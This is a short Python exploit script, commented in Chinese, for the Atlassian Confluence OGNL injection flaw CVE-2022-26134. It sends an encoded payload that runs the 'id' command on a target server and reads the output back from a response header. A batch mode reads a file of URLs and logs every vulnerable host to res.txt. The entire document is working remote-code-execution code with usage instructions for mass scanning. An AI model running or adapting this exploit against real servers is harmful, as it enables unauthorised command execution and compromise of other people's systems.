

import sys
import requests
import urllib3


#Atlassian Confluence OGNL注入漏洞 CVE-2022-26134

def poc(ip):
    urllib3.disable_warnings()
    path = "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
    header = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
            "cmd": "id"
        }
    if 'apache' in ip:
        url = ip
    else:
        url = ip + path

    try:
        res = requests.get(url, headers=header, timeout=2, verify=False, allow_redirects=False)
        print(res.headers)
        if "X-Cmd-Response" in res.headers:

            print(url + "存在漏洞，执行id命令结果：" + str(res.headers["X-Cmd-Response"]))
            with open("res.txt", "a") as f:
                    f.write(url + "\t" + str(res.headers["X-Cmd-Response"]) + "\n")
                    f.close()
    except Exception as e:
        print(e)

if __name__ == '__main__':
    print("使用方法：python cnvd.py -u http://127.0.0.1   批量验证： python cnvd.py -f xxx.txt(复制漏洞url到txt) " )
    try:
        if sys.argv[1] == "-u":
            ip = sys.argv[2]
            poc(ip)
        elif sys.argv[1] == "-f":
            path = sys.argv[2]
            with open(path, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                    for line in lines:
                        line = line.strip("\n")
                        poc(line)
        print("结果保存至：res.txt")
    except:
        print("请输入检测地址")
